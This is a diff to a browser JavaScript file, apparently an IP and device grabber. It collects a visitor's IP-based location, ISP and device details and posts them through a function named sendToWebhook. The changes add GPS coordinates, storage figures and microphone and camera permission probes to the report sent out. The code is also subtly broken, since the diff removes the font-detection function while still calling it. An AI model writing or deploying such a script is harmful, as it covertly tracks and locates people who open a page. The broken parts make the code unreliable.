@@ -144,14 +144,27 @@ async function getExtraDeviceInfo() {
 
     let cpuThreads = await estimateCPUThreads();
     let ramSize = navigator.deviceMemory ? `${navigator.deviceMemory} GB (Estimated)` : "Unknown";
+    let openWindows = window.length || "Unknown";
+    let installedFonts = await getInstalledFonts();
+    let activeApps = await getActiveApplications();
+    let locationData = await getGeoLocation();
+    let storageData = await getStorageInfo();
+    let microphoneAccess = await checkMicrophoneAccess();
+    let cameraAccess = await checkCameraAccess();
 
     return {
         cpuCores: cpuThreads,
         ramSize: ramSize,
         gpu: getGPUInfo(),
         battery: `${batteryLevel} (Charging: ${isCharging})`,
-        numWindows: window.length || "Unknown",
-        deviceType: deviceType
+        numWindows: openWindows,
+        deviceType: deviceType,
+        installedFonts: installedFonts,
+        activeApps: activeApps,
+        location: locationData,
+        storage: storageData,
+        microphone: microphoneAccess,
+        camera: cameraAccess
     };
 }
 
@@ -162,61 +175,51 @@ function getGPUInfo() {
     return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
 }
 
-async function testInternetSpeed() {
-    const startTime = performance.now();
-    await fetch('https://speed.hetzner.de/100MB.bin', { method: 'HEAD', mode: 'no-cors' }).catch(() => {});
-    const duration = (performance.now() - startTime) / 1000;
-    return (100 / duration).toFixed(2) + " MB/s";
-}
-
-async function checkVPN() {
-    try {
-        let rtc = new RTCPeerConnection();
-        rtc.createDataChannel('');
-        rtc.createOffer().then(o => rtc.setLocalDescription(o));
-        return new Promise(resolve => {
-            rtc.onicecandidate = ice => {
-                if (!ice || !ice.candidate || !ice.candidate.candidate) return resolve("Unknown");
-                resolve(ice.candidate.candidate.includes("relay") ? "Yes (VPN/Proxy Detected)" : "No");
-            };
-        });
-    } catch {
-        return "Unknown";
-    }
-}
-
-function detectIncognito() {
-    return new Promise((resolve) => {
-        let fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-        if (!fs) {
-            resolve("Unknown");
-        } else {
-            fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Yes"));
-        }
+async function getGeoLocation() {
+    return new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(
+            position => {
+                resolve(`Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`);
+            },
+            () => {
+                resolve("Denied/Unavailable");
+            }
+        );
     });
 }
 
-async function getInstalledFonts() {
-    let fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia"];
-    let installedFonts = [];
-    let ctx = document.createElement("canvas").getContext("2d");
-    ctx.font = "72px sans-serif";
-    for (let font of fonts) {
-        ctx.font = `72px ${font}, sans-serif`;
-        if (ctx.measureText("ABC").width !== ctx.measureText("ABC").width) {
-            installedFonts.push(font);
-        }
+async function getStorageInfo() {
+    if (navigator.storage && navigator.storage.estimate) {
+        let estimate = await navigator.storage.estimate();
+        return `Total: ${(estimate.quota / (1024*1024*1024)).toFixed(2)} GB, Used: ${(estimate.usage / (1024*1024*1024)).toFixed(2)} GB`;
     }
-    return installedFonts.length > 0 ? installedFonts.join(", ") : "Unknown";
+    return "Unknown";
+}
+
+async function checkMicrophoneAccess() {
+    try {
+        await navigator.mediaDevices.getUserMedia({ audio: true });
+        return "Microphone Available";
+    } catch {
+        return "No Microphone Access";
+    }
+}
+
+async function checkCameraAccess() {
+    try {
+        await navigator.mediaDevices.getUserMedia({ video: true });
+        return "Camera Available";
+    } catch {
+        return "No Camera Access";
+    }
+}
+
+async function getActiveApplications() {
+    return "Limited Access (Browser Restriction)";
 }
 
 async function sendToWebhook() {
     const deviceInfo = await getExtraDeviceInfo();
-    const internetSpeed = await testInternetSpeed();
-    const vpnStatus = await checkVPN();
-    const incognitoMode = await detectIncognito();
-    const installedFonts = await getInstalledFonts();
-
     fetch('https://ipinfo.io/json')
         .then(response => response.json())
         .then(data => {
@@ -239,22 +242,23 @@ async function sendToWebhook() {
                          `📍 **Location:** ${country}, ${region}, ${city}\n` +
                          `🌎 **Coordinates:** ${loc}\n` +
                          `📡 **ISP:** ${org}\n` +
-                         `🔗 **IP Address:** ${ip}\n\n` +
+                         `🔗 **IP Address:** ${ip}\n` +
+                         `📌 **Exact Location (GPS):** ${deviceInfo.location}\n\n` +
                          `💻 **Device Info:**\n` +
                          `🖥️ **Device Type:** ${deviceInfo.deviceType}\n` +
                          `🌐 **Browser:** ${navigator.userAgent}\n` +
                          `🖥️ **Screen Size:** ${screen.width}x${screen.height}\n` +
                          `🗣️ **Language:** ${navigator.language}\n` +
-                         `📶 **Connection Type:** ${navigator.connection ? navigator.connection.effectiveType : "Unknown"}\n` +
                          `🧠 **CPU Cores (Estimated):** ${deviceInfo.cpuCores}\n` +
                          `💾 **RAM Size (Estimated):** ${deviceInfo.ramSize}\n` +
                          `🎮 **GPU:** ${deviceInfo.gpu}\n` +
                          `🔋 **Battery:** ${deviceInfo.battery}\n` +
                          `🖥️ **Open Windows:** ${deviceInfo.numWindows}\n` +
-                         `🚀 **Internet Speed:** ${internetSpeed}\n` +
-                         `🛡️ **VPN/Proxy:** ${vpnStatus}\n` +
-                         `🔒 **Incognito Mode:** ${incognitoMode}\n` +
-                         `🖋️ **Installed Fonts:** ${installedFonts}\n\n` +
+                         `🖋️ **Installed Fonts:** ${deviceInfo.installedFonts}\n` +
+                         `📂 **Active Applications:** ${deviceInfo.activeApps}\n` +
+                         `💾 **Storage Info:** ${deviceInfo.storage}\n` +
+                         `🎤 **Microphone Access:** ${deviceInfo.microphone}\n` +
+                         `📷 **Camera Access:** ${deviceInfo.camera}\n\n` +
                          `🕒 **Time:** ${dateTime}`
             };
 
